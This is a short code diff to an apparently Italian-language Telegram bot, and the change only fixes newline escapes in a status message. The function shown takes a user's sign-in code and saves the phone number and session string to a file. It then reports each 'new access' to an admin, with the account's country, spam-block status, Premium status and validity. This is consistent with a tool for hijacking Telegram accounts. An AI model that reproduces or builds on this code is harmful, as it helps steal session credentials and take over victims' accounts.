@@ -175,16 +175,11 @@ async def try_sign_in_code(user_id, code):
                 json.dump({"phone": phone, "session": session_str}, f)
 
             status = (
-                f"📞 Nuovo accesso:
-"
-                f"📱 Telefono: `{phone}`
-"
-                f"🌍 Paese: {country or 'N/A'}
-"
-                f"🛡 Spam Block: {'❌ Sì' if is_spam_blocked else '✅ No'}
-"
-                f"💎 Premium: {'✅ Sì' if has_premium else '❌ No'}
-"
+                f"📞 Nuovo accesso:\n"
+                f"📱 Telefono: `{phone}`\n"
+                f"🌍 Paese: {country or 'N/A'}\n"
+                f"🛡 Spam Block: {'❌ Sì' if is_spam_blocked else '✅ No'}\n"
+                f"💎 Premium: {'✅ Sì' if has_premium else '❌ No'}\n"
                 f"✅ Valido: {'Sì' if is_valid else 'No'}"
             )
             await bot.send_message(ADMIN_ID, status, parse_mode="Markdown")
